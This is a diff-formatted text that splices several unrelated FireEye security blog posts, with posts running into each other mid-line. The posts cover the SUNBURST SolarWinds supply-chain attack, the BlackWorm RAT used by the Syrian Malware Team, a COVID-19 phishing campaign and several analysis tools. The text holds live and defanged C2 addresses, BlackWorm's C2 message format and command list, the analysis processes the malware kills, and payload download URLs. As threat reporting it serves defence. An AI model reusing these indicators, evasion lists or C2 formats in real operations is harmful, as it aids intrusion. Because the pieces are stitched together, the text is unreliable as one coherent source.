@@ -1,406 +1,785 @@
-Introduction IDA Pro is the de facto standard when it comes to binary reverse engineering.
-Besides being a great disassembler and debugger, it is possible to extend it and include a powerful decompiler by purchasing an additional license from Hex-Rays.
-The ability to switch between disassembled and decompiled code can greatly reduce the analysis time.
-The decompiler (from now on referred to as Hex-Rays ) has been around for a long time and has achieved a good level of maturity.
-However, there seems to be a lack of a concise and complete resources regarding this topic (tutorials or otherwise).
-In this blog, we aim to close that gap by showcasing examples where scripting Hex-Rays goes a long way.
-Overview of a Decompiler In order to understand how the decompiler works, it’s helpful to first review the normal compilation process.
-Compilation and decompilation center around the concept of an Abstract Syntax Tree (AST) .
-In essence, a compiler takes the source code, splits it into tokens according to a grammar, then these tokens are grouped into logical expressions.
-In this phase of the compilation process, referred to as parsing, the code structure is represented as a complex object, the AST.
-From the AST, the compiler will produce assembly code for the specified platform.
-A decompiler takes the opposite route.
-From the given assembly code, it works back to produce an AST, and from this to produce pseudocode.
-From all the intermediate steps between code and assembly, we are stressing the AST so much because most of the time you will spend using the Hex-Rays API, you will actually be reading and/or modifying the Abstract Syntax Tree (or ctree in Hex-Rays terminology).
-Items, Expressions and Statements Now we know that Hex-Rays’s ctree is a tree-like data structure.
-The nodes of this tree are either of type cinsn_t or cexpr_t .
-We will define these in a moment, but for now it is important to know that both derive from a very basic type, namely the citem_t type, as seen in the following code snippet:
-Therefore, all nodes in the ctree will have the op property, which indicates the node type (variable, number, logical expression, etc.).
-The type of op (ctype_t) is an enumeration where all constants are named either cit_<xyz> (for statements) or cot_<xyz> (for expressions).
-Keep this in mind, as it will be very important.
-A quick way to inspect all ctype_t constants and their values is to execute the following code snippet:
-This produces the following output: Let’s dive a bit deeper and explain the two types of nodes: expressions and statements.
-It is useful to think about expressions as the “the little logical elements” of your code.
-They range from simple types such as variables, strings or numerical constants, to small code constructs (assignments, comparisons, additions, logical operations, array indexing, etc.).
-These are of type cexpr_t , a large structure containing several members.
-The members that can be accessed depend on its op value.
-For example, the member n to obtain the numeric value only makes sense when dealing with constants.
-On the other side, we have statements .
-These correlate roughly to language keywords (if, for, do, while, return, etc.)
-Most of them are related to control flow and can be thought as “the big picture elements” of your code.
-Recapitulating, we have seen how the decompiler exposes this tree-like structure (the ctree ), which consists of two types of nodes: expressions and statements.
-In order to extract information from or modify the decompiled code, we have to interact with the ctree nodes via methods dependent on the node type.
-However, the following question arises: “How do we reach the nodes?”
-This is done via a class exposed by Hex-Rays: the tree visitor ( ctree_visitor_t ).
-This class has two virtual methods, visit_insn and visit_expr , that are executed when a statement or expression is found while traversing the ctree.
-We can create our own visitor classes by inheriting from this one and overloading the corresponding methods.
-Example Scripts
-In this section, we will use the Hex-Rays API to solve two real-world problems: Identify calls to GetProcAddress to dynamically resolve Windows APIs, assigning the resulting address to a global variable.
-Display assignments related to stack strings as characters instead of numbers, for easier readability.
-GetProcAddress The first example we will walk through is how to automatically handle renaming global variables that have been dynamically resolved at run time.
-This is a common technique malware uses to hide its capabilities from static analysis tools.
-An example of dynamically resolving global variables using GetProcAddress is shown in Figure 1.
-Figure 1: Dynamic API resolution using GetProcAddress There are several ways to rename the global variables, with the simplest being manual copy and paste.
-However, this task is very repetitive and can be scripted using the Hex-Rays API.
-In order to write any Hex-Rays script, it is important to first visualize the ctree.
-The Hex-Rays SDK includes a sample, sample5, which can be used to view the current function’s ctree.
-The amount of data shown in a ctree for a function can be overwhelming.
-A modified version of the sample was used to produce a picture of a sub-ctree for the function shown in Figure 1.
-The sub-ctree for the single expression: 'dword_1000B2D8 =
-(int)GetProcAdress(v0, \"CreateThread\");' is shown in Figure 2.
+Malware analysts routinely use the Strings program during static analysis in order to inspect a binary's printable characters.
+However, identifying relevant strings by hand is time consuming and prone to human error.
+Larger binaries produce upwards of thousands of strings that can quickly evoke analyst fatigue, relevant strings occur less often than irrelevant ones, and the definition of \"relevant\" can vary significantly among analysts.
+Mistakes can lead to missed clues that would have reduced overall time spent performing malware analysis, or even worse, incomplete or incorrect investigatory conclusions.
+Earlier this year, the FireEye Data Science (FDS) and FireEye Labs Reverse Engineering (FLARE) teams published a blog post describing a machine learning model that automatically ranked strings to address these concerns.
+Today, we publicly release this model as part of StringSifter , a utility that identifies and prioritizes strings according to their relevance for malware analysis.
+Goals StringSifter is built to sit downstream from the Strings program; it takes a list of strings as input and returns those same strings ranked according to their relevance for malware analysis as output.
+It is intended to make an analyst's life easier, allowing them to focus their attention on only the most relevant strings located towards the top of its predicted output.
+StringSifter is designed to be seamlessly plugged into a user’s existing malware analysis stack.
+Once its GitHub repository is cloned and installed locally, it can be conveniently invoked from the command line with its default arguments according to: strings <sample_of_interest
+> | rank_strings
+We are also providing Docker command line tools for additional portability and usability.
+For a more detailed overview of how to use StringSifter, including how to specify optional arguments for customizable functionality, please view its README file on GitHub .
+We have received great initial internal feedback about StringSifter from FireEye’s reverse engineers, SOC analysts, red teamers, and incident responders.
+Encouragingly, we have also observed users at the opposite ends of the experience spectrum find the tool to be useful – from beginners detonating their first piece of malware as part of a FireEye training course – to expert malware researchers triaging incoming samples on the front lines.
+By making StringSifter publicly available, we hope to enable a broad set of personas, use cases, and creative downstream applications.
+We will also welcome external contributions to help improve the tool’s accuracy and utility in future releases.
+Conclusion We are releasing StringSifter to coincide with our presentation at DerbyCon 2019 on Sept. 7, and we will also be doing a technical dive into the model at the Conference on Applied Machine Learning for Information Security this October.
+With its release, StringSifter will join FLARE VM , FakeNet , and CommandoVM as one of many recent malware analysis tools that FireEye has chosen to make publicly available.
+If you are interested in developing data-driven tools that make it easier to find evil and help benefit the security community, please consider joining the FDS or FLARE teams by applying to one of our job openings .
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+Executive Summary We have discovered a global intrusion campaign.
+We are tracking the actors behind this campaign as UNC2452.
+FireEye discovered a supply chain attack trojanizing SolarWinds Orion business software updates in order to distribute malware we call SUNBURST.
+The attacker’s post compromise activity leverages multiple techniques to evade detection and obscure their activity, but these efforts also offer some opportunities for detection.
+The campaign is widespread, affecting public and private organizations around the world.
+FireEye is releasing signatures to detect this threat actor and supply chain attack in the wild.
+These are found on our public GitHub page .
+FireEye products and services can help customers detect and block this attack.
+Summary FireEye has uncovered a widespread campaign, that we are tracking as UNC2452.
+The actors behind this campaign gained access to numerous public and private organizations around the world.
+They gained access to victims via trojanized updates to SolarWind’s Orion IT monitoring and management software.
+This campaign may have begun as early as Spring 2020 and is currently ongoing.
+Post compromise activity following this supply chain compromise has included lateral movement and data theft.
+The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.
+SUNBURST Backdoor SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.
+We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.
+After an initial dormant period of up to two weeks, it retrieves and executes commands, called “Jobs”, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services.
+The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.
+The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.
+Figure 1: SolarWinds digital signature on software with backdoor Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp
+The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.
+Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).
+After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.
+The DNS response will return a CNAME record that points to a Command and Control (C2) domain.
+The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.
+The list of known malicious infrastructure is available on FireEye’s GitHub page .
+Worldwide Victims Across Multiple Verticals FireEye has detected this activity at multiple entities worldwide.
+The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East.
+We anticipate there are additional victims in other countries and verticals.
+FireEye has notified all entities we are aware of being affected.
+Post Compromise Activity and Detection Opportunities We are currently tracking the software supply chain compromise and related post intrusion activity as UNC2452.
+After gaining initial access, this group uses a variety of techniques to disguise their operations while they move laterally (Figure 2).
+This actor prefers to maintain a light malware footprint, instead preferring legitimate credentials and remote access for access into a victim’s environment.
 Figure 2:
-Sub-ctree for GetProcAddress assignment With knowledge of the sub-ctree in use, we can write a script to automatically rename all the global variables that are being assigned using this method.
-The code to automatically rename all the local variables is shown in Figure 3.
-The code works by traversing the ctree looking for calls to the GetProcAddress function.
-Once found, the code takes the name of the function being resolved and finds the global variable that is being set.
-The code then uses the IDA MakeName API to rename the address to the correct function.
-Figure 3:
-Function renaming global variables After the script has been executed, we can see in Figure 4 that all the global variables have been renamed to the appropriate function name.
-Figure 4: Global variables renamed Stack Strings
-Our next example is a typical issue when dealing with malware: stack strings .
-This is a technique aimed to make the analysis harder by using arrays of characters instead of strings in the code.
-An example can be seen in Figure 5; the malware stores each character’s ASCII value in the stack and then references it in the call to sprintf .
-At a first glance, it’s very difficult to say what is the meaning of this string (unless of course, you know the ASCII table by heart).
-Figure 5: Hex-Rays decompiler output.
-Stack strings are difficult to read.
-Our script will modify these assignments to something more readable.FireEye's Innovation and Custom Engineering (ICE) team released a tool today called GoCrack that allows red teams to efficiently manage password cracking tasks across multiple GPU servers by providing an easy-to-use, web-based real-time UI (Figure 1 shows the dashboard) to create, view, and manage tasks.
-Simply deploy a GoCrack server along with a worker on every GPU/CPU capable machine and the system will automatically distribute tasks across those GPU/CPU machines.
+Post-compromise tactics This section will detail the notable techniques and outline potential opportunities for detection.
+TEARDROP and BEACON Malware Used Multiple SUNBURST samples have been recovered, delivering different payloads.
+In at least one instance the attackers deployed a previously unseen memory-only dropper we’ve dubbed TEARDROP to deploy Cobalt Strike BEACON.
+TEARDROP is a memory only dropper that runs as a service, spawns a thread and reads from the file “gracious_truth.jpg”, which likely has a fake JPG header.
+Next it checks that HKU\\SOFTWARE\\Microsoft\\CTF exists, decodes an embedded payload using a custom rolling XOR algorithm and manually loads into memory an embedded payload using a custom PE-like file format.
+TEARDROP does not have code overlap with any previously seen malware.
+We believe that this was used to execute a customized Cobalt Strike BEACON.
+Mitigation : FireEye has provided two Yara rules to detect TEARDROP available on our GitHub .
+Defenders should look for the following alerts from FireEye HX:
+MalwareGuard and WindowsDefender: Process Information file_operation_closed file-path*: “c:\\\\windows\\\\syswow64\\\\netsetupsvc.dll actor-process: pid: 17900
+Window’s defender Exploit Guard log entries: (Microsoft-Windows-Security-Mitigations/KernelMode event ID 12) Process”\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe” (PID XXXXX) would have been blocked from loading the non-Microsoft-signed binary ‘\\Windows\\SysWOW64\\NetSetupSvc.dll’
+Attacker Hostnames Match Victim Environment The actor sets the hostnames on their command and control infrastructure to match a legitimate hostname found within the victim’s environment.
+This allows the adversary to blend into the environment, avoid suspicion, and evade detection.
+Detection Opportunity
+The attacker infrastructure leaks its configured hostname in RDP SSL certificates, which is identifiable in internet-wide scan data.
+This presents a detection opportunity for defenders -- querying internet-wide scan data sources for an organization’s hostnames can uncover malicious IP addresses that may be masquerading as the organization.
+(Note: IP Scan history often shows IPs switching between default (WIN-*) hostnames and victim’s hostnames)
+Cross-referencing the list of IPs identified in internet scan data with remote access logs may identify evidence of this actor in an environment.
+There is likely to be a single account per IP address.
+IP Addresses located in Victim’s Country
+The attacker’s choice of IP addresses was also optimized to evade detection.
+The attacker primarily used only IP addresses originating from the same country as the victim, leveraging Virtual Private Servers.
+Detection Opportunity
+This also presents some detection opportunities, as geolocating IP addresses used for remote access may show an impossible rate of travel if a compromised account is being used by the legitimate user and the attacker from disparate IP addresses.
+The attacker used multiple IP addresses per VPS provider, so once a malicious login from an unusual ASN is identified, looking at all logins from that ASN can help detect additional malicious activity.
+This can be done alongside baselining and normalization of ASN’s used for legitimate remote access to help identify suspicious activity.
+Lateral Movement Using Different Credentials Once the attacker gained access to the network with compromised credentials, they moved laterally using multiple different credentials.
+The credentials used for lateral movement were always different from those used for remote access.
+Detection Opportunity Organizations can use HX’s LogonTracker module to graph all logon activity and analyze systems displaying a one-to-many relationship between source systems and accounts.Introduction We’re proud to release a new plug-in for IDA Pro users – SimplifyGraph – to help automate creation of groups of nodes in the IDA’s disassembly graph view.
+Code and binaries are available from the FireEye GitHub repo .
+Prior to this release we submitted it in the 2017 Hex-Rays plugin contest , where it placed third overall.
+My personal preference is to use IDA’s graph mode when doing the majority of my reverse engineering.
+It provides a graphical representation of the control flow graph and gives visual cues about the structure of the current function that helps me better understand the disassembly.
+Graph mode is great until the function becomes complex.
+IDA is often forced to place adjacent nodes relatively far apart, or have edges in the graph cross and have complex paths.
+Using the overview graph becomes extremely difficult due to the density of nodes and edges, as seen in Figure 1.
 Figure 1:
-Dashboard As readers of this blog probably know, password cracking tools are an effective way for security professionals to test password effectiveness, develop improved methods to securely store passwords, and audit current password requirements.
-Some use cases for a password cracking tool can include cracking passwords on exfil archives, auditing password requirements in internal tools, and offensive/defensive operations.
-We’re releasing GoCrack to provide another tool for distributed teams to have in their arsenal for managing password cracking and recovery tasks.
-Keeping in mind the sensitivity of passwords, GoCrack includes an entitlement-based system that prevents users from accessing task data unless they are the original creator or they grant additional users to the task.
-Modifications to a task, viewing of cracked passwords, downloading a task file, and other sensitive actions are logged and available for auditing by administrators.
-Engine files (files used by the cracking engine) such as Dictionaries, Mangling Rules, etc. can be uploaded as “Shared”, which allows other users to use them in task yet do not grant them the ability to download or edit.
-This allows for sensitive dictionaries to be used without enabling their contents to be viewed.
-Figure 2 shows a task list, Figure 3 shows the “Realtime Status” tab for a task, and Figure 4 shows the “Cracked Passwords” tab.
+An annoying function IDA has a built-in mechanism to help simplify graphs: creating groups of nodes, which replaces all of the selected nodes with a new group node representative.
+This is done by selecting one or more nodes, right-clicking, and selecting “Group nodes”, as shown in Figure 2.
+Doing this manually is certainly possible, but it becomes tedious to follow edges in complex graphs and correctly select all of the relevant nodes without missing any, and without making mistakes.
 Figure 2:
-Task Listing Figure 3:
-Task Status Figure 4: Cracked Passwords Tab GoCrack is shipping with support for hashcat v3.6+, requires no external database server (via a flat file), and includes support for both LDAP and database backed authentication.
-In the future, we plan on adding support for MySQL and Postgres database engines for larger deployments, ability to manage and edit files in the UI, automatic task expiration, and greater configuration of the hashcat engine.
-We’re shipping with Dockerfile’s to help jumpstart users with GoCrack.
-The server component can run on any Linux server with Docker installed.
-Users with NVIDIA GPUs can use NVIDIA Docker to run the worker in a container with full access to the GPUs.
-GoCrack is available immediately for download along with its source code on the project's GitHub page .
-If you have any feature requests, questions, or bug reports, please file an issue in GitHub.
-ICE is a small, highly trained, team of engineers that incubate and deliver capabilities that matter to our products, our clients and our customers.
-ICE is always looking for exceptional candidates interested in solving challenging problems quickly.
-If you’re interested, check out FireEye careers .
+Manual group creation The SimplifyGraph IDA Pro plug-in we’re releasing is built to automate IDA’s node grouping capability.
+The plug-in is source-compatible with the legacy IDA SDK in 6.95, and has been ported to the new SDK for IDA 7.0.
+Pre-built binaries for both are available on the Releases tab for the project repository .
+The plug-in has several parts, which are introduced below.
+By combining these together it’s possible to isolate parts of a control flow graph for in-depth reverse engineering, allowing you to look at Figure 3 instead of Figure 1.
+Figure 3: Isolated subgraph to focus on Create Unique-Reachable (UR)
+Subgraph Unique-Reachable nodes are all nodes reachable in the graph from a given start node and that are not reachable from any nodes not currently in the UR set.
+For example, in Figure 4, all of the Unique-Reachable nodes starting at the green node are highlighted in blue.
+The grey node is reachable from the green node, but because it is reachable from other nodes not in the current UR set it is pruned prior to group creation.
+Figure 4:
+Example Unique Reachable selection The plug-in allows you to easily create a new group based on the UR definition.
+Select a node in IDA's graph view to be the start of the reachable search.
+Right click and select \"SimplifyGraph -> Create unique-reachable group\".
+The plug-in performs a graph traversal starting at this node, identifies all reachable nodes, and prunes any nodes (and their reachable nodes) that have predecessor nodes not in the current set.
+It then prompts you for the node text to appear in the new group node.
+If you select more than one node (by holding the Ctrl key when selecting nodes) for the UR algorithm, each additional node acts as a sentry node.
+Sentry nodes will not be included in the new group, and they halt the graph traversal when searching for reachable nodes.
+For example, in Figure 5, selecting the green node first treats it as the starting node, and selecting the red node second treats it as a sentry node.
+Running the “Create unique-reachable group” plug-in option creates a new group made of the green node and all blue nodes.
+This can be useful when you are done analyzing a subset of the current graph, and wish to hide the details behind a group node so you can concentrate on the rest of the graph.
+Figure 5:
+Unique reachable with sentry The UR algorithm operates on the currently visible graph, meaning that you can run the UR algorithm repeatedly and nest groups.
+Switch Case Groups Creation Switch statements implemented as jump tables appear in the graph as nodes with a large fan-out, as shown in Figure 6.
+The SimplifyGraph plug-in detects when the currently selected node has more than two successor nodes and adds a right-click menu option “SimplifyGraph -> Create switch case subgraphs”.
+Selecting this runs the Unique-Reachable algorithm on each separate case branch and automatically uses IDA’s branch label as the group node text.
+Figure 6:
+Switch jumptable use Figure 7 shows a before and after graph overview of the same function when the switch-case grouping is run.
+Figure 7:
+Before and after of switch statement groupings Isolated Subgraphs Running Edit -> Plugins -> SimplifyGraph brings up a new chooser named \"SimplifyGraph - Isolated subgraphs\" that begins showing what I call isolated subgraphs of the current graph, as seen in Figure 8.
+Figure 8:
+Example isolated subgraphs chooser A full definition appears later in the appendix including how these are calculated, but the gist is that an isolated subgraph in a directed graph is a subset of nodes and edges such that there is a single entrance node, a single exit node, and none of the nodes (other than the subgraph entry node) is reachable by nodes not in the subgraph.
+Finding isolated subgraphs was originally researched to help automatically identify inline functions.
+It does this, but it turns out that this graph construct occurs naturally in code without inline functions.
+This isn’t a bad thing as it shows a natural grouping of nodes that could be a good candidate to group to help simplify the overall graph and make analysis easier.
+Once the chooser is active, you can double click (or press Enter) on a row in the chooser to highlight the nodes that make up the subgraph, as seen in Figure 9.
+Figure 9:
+Highlighted isolated subgraph You can create a group for an isolated subgraph by: Right-clicking on the chooser row and selecting \"Create group\", or pressing Insert while a row is selected.
+Right-clicking in a highlighted isolated subgraph node and selecting \"SimplifyGraph ->
+Create isolated subgraph\".
+Doing either of these prompts you for text for the new graph node to create.
+If you manually create/delete groups using IDA you may need to refresh the chooser's knowledge of the current function groups (right-click and select \"Refresh groups\" in the chooser).
+You can right click in the chooser and select \"Clear highlights\" to remove the current highlights.
+As you navigate to new functions the chooser updates to show isolated subgraphs in the current function.
+Closing the chooser removes any active highlights.
+Any custom colors you applied prior to running the plug-in are preserved and reapplied when the current highlights are removed.
+Isolated subgraph calculations operates on the original control flow graph, so isolated subgroups can't be nested.The Syrian Electronic Army has made news for its recent attacks on major communications websites , Forbes , and an alleged attack on CENTCOM .
+While these attacks garnered public attention, the activities of another group - The Syrian Malware Team - have gone largely unnoticed.
+The group’s activities prompted us to take a closer look.
+We discovered this group using a .NET based RAT called BlackWorm to infiltrate their targets.
+The Syrian Malware Team is largely pro-Syrian government, as seen in one of their banners featuring Syrian President Bashar al-Assad.
+Based on the sentiments publicly expressed by this group it is likely that they are either directly or indirectly involved with the Syrian government.
+Further certain members of the Syrian Malware Team have ties to the Syrian Electronic army (SEA) known to be linked to the Syrian government .
+This indicates that the Syrian Malware Team may also be possibly an offshoot or part of the SEA.
+Banner used by the Syrian Malware Team BlackWorm
+Authorship We found at least two distinct versions of the BlackWorm tool, including an original/private version (v0.3.0) and the Dark Edition (v2.1).
+The original BlackWorm builder was co-authored by Naser Al Mutairi from Kuwait, better known by his online moniker 'njq8'.
+He is also known to have coded njw0rm , njRAT/LV , and earlier versions of H-worm/Houdini .
+We found his code being used in a slew of other RATs such as Fallaga and Spygate.
+BlackWorm v0.3.0 was also co-authored by another actor, Black Mafia.
+About section within the original version of BlackWorm builder Within the underground development forums, it’s common for threat actors to collaborate on toolsets.
+Some write the base tools that other attackers can use; others modify and enhance existing tools.
+The BlackWorm builder v2.1 is a prime example of actors modifying and enhancing current RATs.
+After njq8 and Black Mafia created the original builder, another author, Black.
+Hacker, enhanced its feature set.
+About section within BlackWorm Dark Edition builder Black.
+Hacker's banner on social media As an interesting side note, 'njq8' took down his blog in recent months and announced a cease in all malware development activity on his Twitter and Facebook account, urging others to stop as well.
+This is likely a direct result of the lawsuit filed against him by Microsoft .
+BlackWorm
+RAT Features The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload, but doesn’t allow any configuration other than the IP address for command and control (C2).
+Building binary through BlackWorm v0.3.0 BlackWorm v0.3.0 controller BlackWorm v0.3.0 supports the following commands between the controller and the implant: ping Checks if victim is online closeserver Exits the implant restartserver Restarts the implant sendfile Transfer and run file from server download Download and run file from URL ddos Ping flood target msgbox Message interaction with victim down Kill critical windows processes blocker Block specified website by pointing resolution to 127.0.0.1 logoff Logout out of windows restart Restart system shutdown Shutdown system more Disable task manager, registry tools, system restore.
+Also blocks keyboard and mouse input hror Displays a startling flash video
+In addition to the features supported by the command structure, the payload can: Seek and kill no-ip processes DUC30 and DUC20 Disable Task Manager to kill process dialog Copy itself to USB drives and create autorun entries Copy itself to common peer-to-peer (P2P) share locations Collect system information such as OS, username, hostname, presence of camera, active window name, etc., to display in the controller Kill the following analysis processes (if found): procexp SbieCtrl SpyTheSpy SpeedGear Wireshark MBAM ApateDNS IPBlocker cPorts ProcessHacker AntiLogger
+The Syrian Malware Team primarily uses another version of BlackWorm called the Dark Edition (v2.1).
+BlackWorm v2.1 was released on a prolific underground forum where information and code is often shared, traded and sold.
+BlackWorm v2.1 has the same abilities as the original version and additional functionality, including bypassing UAC, disabling host firewalls and spreading over network shares.
+Unlike its predecessor, it also allows for granular control of the features available within the RAT.
+These additional controls allow the RAT user to enable and disable features as needed.
+Binary output can be also be generated in multiple formats, such as .exe, .src
+and .dll.
+BlackWorm Dark Edition builder Syrian Malware Team
+We observed activity from the Syrian Malware Team going as far back as Jan. 1, 2011.
+Based on Facebook posts, they are allegedly directly or indirectly involved with the Syrian government.
+Their Facebook page shows they are still very active, with a post as recent as July 16 th , 2014.
+Syrian Malware Team’s Facebook page The Syrian Malware Team has been involved in everything from profiling targets to orchestrating attacks themselves.
+There are seemingly multiple members, including: https://www.facebook.com/hawk.syrian.9 https://www.facebook.com/kays.syr Partial list of self-proclaimed Syrian Malware Team members Some of these people have posted malware-related items on Facebook.
+Facebook posting of virus scanning of files While looking for Dark Edition samples, we discovered a binary named svchost.exe (MD5: 015c51e11e314ff99b1487d92a1ba09b).
+We quickly saw indicators that it was created by BlackWorm Dark Edition.
+Configuration options within code
+The malware communicated out to 178.44.115.196, over port 5050, with a command structure of: !0
+/j|n\\12121212_64F3BF1F/j|n\\{Hostname}/j|n\\{Username}/j|n\\USA/j|n\\Win 7 Professional SP1 x86/j|n\\No/j|n\\2.4.0 [ Dark Edition]/j|n\\/j|n\\{ActiveWindowName}/j|n\\[endof]
+When looking at samples of Dark Edition BlackWorm being used by the Syrian Malware Team, the strings “Syrian Malware,” or “ Syrian Malware Team ” are often used in the C2 communications or within the binary strings.
+Additional pivoting off of svchost.exe brought us to three additional samples apparently built with BlackWorm Dark Edition.
+E.exe, (MD5: a8cf815c3800202d448d035300985dc7) a binary that drew our attention, looked to be a backdoor with the Syrian Malware strings within it.
+When executed, the binary beacons to aliallosh.sytes.net on port 1177.
+This C2 has been seen in multiple malware runs often associated with Syria.
+ The command structure of the binary is: !0
+/j|n\\Syrian Malware/j|n\\{Hostname}/j|n\\{Username}/j|n\\USA/j|n\\Win 7 Professional SP1 x86/j|n\\No/j|n \\0.1/j|n\\/j|n\\{ActiveWindowName}/j|n\\[endof] Finally, pivoting to another sample, 1gpj.srcRania (MD5:f99c15c62a5d981ffac5fdb611e13095), the same strings were present.
+The string \"Rania\" used as a lure was in Arabic and likely refers to the prolific Queen Rania of Jordan .
+The traffic is nearly identical to the other samples we identified and tied to the Syrian Malware Team. !
+1/j|n\\C:\\Documents and Settings\\{Username}\\Local Settings\\Application DataldoDrZdpkK.jpg - Windows Internet Explorer[endof]!0/
+j|n\\Syrian Malware/j|n\\{Hostname}/j|n\\{Username}/j|n\\USA/j|n\\Win
+XP ProfessionalSP2 x86/j|n\\No/j|n\\0.1/j|n\\/j|n\\C:\\Documents and Settings\\{Username}\\Local Settings\\Application DataldoDrZdpkK.jpg - {ActiveWindowName}/j|n\\[endof]
+Conclusion Determining which groups use which malware is often very difficult.
+Connecting the dots between actors and malware typically involves looking at binary code, identifying related malware examples associated with those binaries, and reviewing infection vectors, among other things.
+This blog presents a prime example of the process of attribution.
+We connected a builder with malware samples and the actors/developers behind these attacks.
+This type of attribution is key to creating actionable threat intelligence to help proactively protect organizations.
 Subscribe to Blogs Get email updates as new blog posts are added.
 
 
-Over the last couple of decades, Java has become the lingua franca of software development, a near-universal platform that works across different operating systems and devices.
-With its “write once, run anywhere” mantra, Java has drawn a horde of developers looking to serve a large user base as efficiently as possible.
-Cyber attackers like Java for many of the same reasons.
-With a wide pool of potential targets, the platform has become the vehicle of choice for quickly dispersing lucrative crimeware packages.
-In our continuing mission to equip security professionals against today’s advanced cyber threats, FireEye has published a free report, “ Brewing Up Trouble: Analyzing Four Widely Exploited Java Vulnerabilities .”
-The report outlines four commonly exploited Java vulnerabilities and maps out the step-by-step infection flow of exploits kits that leverage them.
-Download the paper to learn more about these vulnerabilities: CVE-2013-2471 , which allows attackers to override Java’s getNumDataElements() method, leading to memory corruption.
-CVE-2013-2465 ,  which involves insufficient bounds checks in the storeImageArray() function.
-This vulnerability is used by White Lotus and other exploit kits.
-CVE-2012-4681 ,  which allows attackers to bypass security checks using the findMethod () function.
-CVE-2013-2423 , which  arises due to insufficient validation in the findStaticSetter () method, leading to Java type confusion.
-This vulnerability employed by RedKit and other exploits kits.
-As explained in the paper, Java’s popularity among the developers and widespread use in Web browsers all but  guarantees continuing interest from threat actors.
-Motivated by the profits, cyber attackers are bound to adopt more intelligent exploit kits.
-And these attacks will continue to mushroom as more threat actors scramble for a piece of the crimeware pie.
-Subscribe to Blogs Get email updates as new blog posts are added.
-
-
-The term \"critical infrastructure\" has earned its spot on the board of our ongoing game of cyber bingo--right next to \"Digital Pearl Harbor,\" \"Cyber 9/11,\" \"SCADA\" and \"Stuxnet.\" With \"critical infrastructure\" thrown about in references to cyber threats nearly every week, we thought it was time for a closer look at just what the term means-and what it means to other cyber threat actors.
-The term \" critical infrastructure \" conjures up images of highways, electrical grids, pipelines, government facilities and utilities.
-But the U.S. government definition also includes economic security and public health.
-The Department of Homeland Security defines critical infrastructure as \"Systems and assets, whether physical or virtual, so vital to the United States that the incapacity or destruction of such systems and assets would have a debilitating impact on security, national economic security, national public health or safety, or any combination of those matters.\" [1] Certainly the U.S. definition is expansive, but some key cyber actors go a step further to include a more abstract \"information \" asset.
-Russian officials view information content, flow and influencers as an enormous component of critical infrastructure.
-Iran and China similarly privilege the security of their information assets in order to protect their governments.
-The bottom line?
-U.S. companies, who may have never considered themselves a plausible target for cyber threats, could become victims of offensive or defensive state cyber operations.
-Earlier this year several media outlets-including the New York Times and Washington Post-disclosed that they had been the victims of China-based intrusions.
-The Times and the Post linked the intrusions on their networks to their reporting on corruption in the upper echelons of the Chinese Communist Party and other issues.
-These media outlets weren't sitting on plans for a new fighter jet or cutting edge wind turbines-information often assumed to be at risk for data theft.
-Rather, the reporters at the Times and Post were perched in key positions to influence U.S. government and public views of the Chinese leadership, possibly in a negative light.
-The Chinese government had conducted these intrusions against what it deemed critical infrastructure that supported the flow of valuable information.
-Who's up next?
-State actors motivated to target critical infrastructure (by their own definition or the U.S.') won't just be the usual attention grabbers in cyberspace.
-We estimate that Iran, Syria, and North Korea all have interest and would be able to conduct or direct some level of network operations.
-These states are also likely to conduct operations in the near term to identify red lines and gauge corporate and government reactions.
-With little reputational loss at stake, we expect actors sponsored by or associated with these states to target an array of critical infrastructure targets.
-Companies who serve as key information brokers-for the public or the U.S. government-should be particularly attuned to the criticality their work is assigned by a variety of cyber threat actors.
-http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf Subscribe to Blogs Get email updates as new blog posts are added.
-
-
-Given the community interest and media coverage surrounding the economic stimulus bill currently being considered by the United States House of Representatives, we anticipate attackers will increasingly leverage lures tailored to the new stimulus bill and related recovery efforts such as stimulus checks, unemployment compensation and small business loans.
-Although campaigns employing themes relevant to these matters are only beginning to be adopted by threat actors, we expect future campaigns—primarily those perpetrated by financially motivated threat actors—to incorporate these themes in proportion to the media’s coverage of these topics.
-Threat actors with varying motivations are actively exploiting the current pandemic and public fear of the coronavirus and COVID-19.
-This is consistent with our expectations; malicious actors are typically quick to adapt their social engineering lures to exploit major flashpoints along with other recurrent events (e.g. holidays, Olympics).
-Security researchers at FireEye and in the broader community have already begun to identify and report on COVID-19 themed campaigns with grant, payment, or economic recovered themed emails and attachments.
-Example Malware Distribution Campaign On March 18, individuals at corporations across a broad set of industries and geographies received emails with the subject line “COVID-19 Payment” intended to distribute the SILENTNIGHT banking malware (also referred to by others as Zloader).
-Despite the campaign’s broad distribution, a plurality of associated messages were sent to organizations based in Canada.
-Interestingly, although the content of these emails was somewhat generic, they were sometimes customized to reference a payment made in currency relevant to the recipient’s geography and contextually relevant government officials (Figure 1 and Figure 2).
-These emails were sent from a large pool of different @gmx.com email addresses and had password protected Microsoft Word document attachments using the file name “COVID 19 Relief.doc” (Figure 3).
-The emails appear to be auto generated and follow the format <name>.<name><SevenNumberString>@gmx.com.
-When these documents were opened and macros enabled, they would drop and execute a .JSE script crafted to download and execute an instance of SILENTNIGHT from http://209.141.54[.]161/crypt18.dll.
